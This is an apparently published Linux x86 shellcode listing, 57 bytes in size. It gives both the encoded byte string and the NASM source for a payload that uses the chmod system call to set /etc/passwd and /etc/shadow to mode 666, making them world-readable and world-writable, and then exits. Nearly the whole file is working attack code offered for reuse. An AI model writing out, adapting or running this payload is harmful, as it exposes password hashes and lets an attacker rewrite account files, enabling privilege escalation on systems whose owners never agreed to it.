; Title:	Linux x86 chmod 666 /etc/passwd & /etc/shadow - 57 bytes
; Author:	Jean Pascal Pereira <pereira@secbiz.de>
; Web:	http://0xffe4.org
; Reference: http://shell-storm.org/shellcode/files/shellcode-812.php
; Shellcode: "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80"
; Length: 57 bytes

global _start

section .text

_start:

    xor eax,eax
    mov cx,0x1b6
    push eax
    push dword 0x64777373
    push dword 0x61702f2f
    push dword 0x6374652f
    mov ebx,esp
    mov al,0xf
    int 0x80

    xor eax,eax
    push eax
    push dword 0x776f6461
    push dword 0x68732f2f
    push dword 0x6374652f
    mov ebx,esp
    mov al,0xf
    int 0x80

    xor eax,eax
    inc eax
    int 0x80
